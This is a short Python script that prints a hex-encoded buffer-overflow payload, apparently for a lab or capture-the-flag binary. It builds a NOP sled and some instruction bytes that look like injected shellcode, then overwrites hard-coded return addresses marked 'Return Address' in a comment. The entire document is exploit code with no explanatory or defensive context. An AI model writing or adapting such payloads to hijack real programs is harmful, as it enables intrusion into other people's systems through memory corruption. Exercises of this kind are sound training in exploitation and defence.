upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"

for i in upper:
    #if i == 'V':
        # 0x62f99261
        #print("6192f962",end="")
        #continue
    if i < "M":
        print("90"*4, end="")
        continue

    if i > "M" and i < "P":
        continue

    if i == "M":
        print("c7406c2b", end="")
        print("fb6990c3", end="")
        print("90909090", end="")
        continue

    if i != 'P' and i != 'T':
        print(str(hex(ord(i)))[2:]*4 ,end="")
    elif i == 'T':
        # Return Address
        # 0xffffccfc
        # 0x08049683
        print("f1960408", end="")
        print("fcccffff",end="")
        print("83960408",end="")
    else:
        # 0x30307761
        print("61773030",end="")

